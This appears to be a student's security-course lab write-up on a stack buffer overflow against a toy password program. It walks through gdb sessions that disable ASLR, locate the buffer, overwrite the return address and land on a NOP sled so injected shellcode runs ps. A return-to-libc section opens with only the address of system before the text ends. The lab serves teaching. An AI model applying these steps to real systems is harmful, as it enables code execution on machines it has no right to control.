Part 1: Code Inject

The shell code is appended in the end of this template. This shell code will run “ps” program to print the running processes.
To complete this exploit, the start address of the shell code should be used to overflow the return address.
Since the shell code will be injected on the stack, figuring out the address of “Password” on the stack is the key to solve this problem.

before start need to disable ASLR
    echo 0 > /proc/sys/kernel/randomize_va_space

Steps:

set a break point at IsPasswordOkay then run until break and print Password address and examine registers

(gdb) b IsPasswordOkay
    Breakpoint 1 at 0x8048471: file example01.c, line 7.

(gdb) r
    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01
    Enter password:

    Breakpoint 1, IsPasswordOkay () at example01.c:7
    7	  gets(Password);

(gdb) display &Password
    &Password = (char (*)[12]) 0xffffd054

(gdb) info registers
    ...
    esp            0xffffd050
    ebp            0xffffd068
    ...
    eip            0x8048471
    ...

the address of the array &Password is at ebp-0x14

trying to run with the original codeinjection.bin shell code

(gdb) r < codeinjection.bin
    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01 < codeinjection.bin
    Enter password:

    Program received signal SIGSEGV, Segmentation fault.
    0x31313131 in ?? ()

this causes a segfault but also reveals what parts of the shellcode end up where.

in the shell code the series of 31 31 31 31 31 31 31 31 affects the ebp and eip registers.
first 4 bytes changes ebp
last 4 bytes changes eip

have to write the addresses backwards so 0xffffd054 becomes 54 d0 ff ff

it seems like the beginning bytes before the sequence of 8 bytes of "31" might not do stuff
the group of "90" bytes after the "31"s forms the NOP sled since the hex 90 is a no-operation code
the actual part to launch the shell and execute ps is at the bottom of the NOP sled.

Password array is size 12, the part to change ebp will start at Password[20], and the part to change eip will start at Password[24]
The NOP sled then begins at Password[28], once execution gets there it will cycle over the NOPs and eventually execute the PS command
&Password[20] = 0xffffd068
&Password[24] = 0xffffd06c
&Password[28] = 0xffffd070

the goal is to locate the start of the NOP sled and change the eip to go there
so the last 4 bytes in the group of "31"s is changed to 70 D0 FF FF

now when executing the modified shell code successful

(gdb) r < inject.bin
Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01 < inject.bin
Enter password:
process 5411 is executing new program: /bin/ps
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
  PID TTY          TIME CMD
 3799 pts/1    00:00:00 bash
 5407 pts/1    00:00:00 gdb
 5411 pts/1    00:00:00 ps
[Inferior 1 (process 5411) exited normally]

----------------------------------------

Part 2: Return to libc

(gdb) display &system
    &system = (<text variable, no debug info> *) 0xf7e2cda0 <system>

